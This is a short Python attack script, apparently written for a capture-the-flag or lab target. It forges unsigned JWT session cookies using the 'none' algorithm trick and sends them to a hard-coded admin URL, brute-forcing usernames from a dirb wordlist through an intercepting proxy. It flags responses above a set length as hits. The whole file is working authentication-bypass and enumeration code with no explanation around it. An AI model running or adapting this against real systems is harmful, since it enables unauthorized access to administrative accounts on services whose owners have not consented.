import requests
import time
import sys
import base64

session = requests.Session()

session.cookies['session'] = ""
session.proxies = {'http':'http://127.0.0.1:8080/', 'https':'http://127.0.0.1:8080'}

test_user = ""
payload_length = 0

with open("/usr/share/dirb/wordlists/big.txt", "r") as dictionary:
    for word in dictionary:
        test_word = word.strip('\n')
        url = 'http://139.177.183.71:9000/admin-f83acbfe8e3391c7f6626397b50b45c5'
        parametry = {"username":f"{test_word}","password":"testing"}
        print(f"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n{parametry}")
        try:
            string_for_base64 = '{"username":' + '"' + test_word + '"' + ',"password":"testing"}'
            string_for_base64_ascii = string_for_base64.encode("ascii")
            base64_encode = base64.b64encode(string_for_base64_ascii)
            if base64_encode.decode().endswith("="):
                test_user = base64_encode.decode().strip("=")
            elif base64_encode.decode().endswith("=="):
                test_user = base64_encode.decode().strip("==")
            elif  base64_encode.decode().endswith("==="):
                test_user = base64_encode.decode().strip("===")
            else:
                test_user = base64_encode.decode().strip("")
            print(test_user)
            session.cookies['session'] =  f'eyJhbGciOiJOb25FIiwidHlwIjoiSldUIn0%3d.{test_user}.'
            print(session.cookies['session'])
            r_test = session.get(url, data=parametry)
            print(r_test.status_code)
            print(r_test.text)
            payload_length = len(r_test.content) - len(test_user)
            print(payload_length)
            if payload_length > 574:
                print("\nSUPER\n")
        except KeyboardInterrupt:
            print("user interrupt, exit.")
            break
        except:
            print(f'Username can only contain uppercase and lowercase alphanumeric characters. Testing username: {test_word} does not contain only alphanumeric characters.')
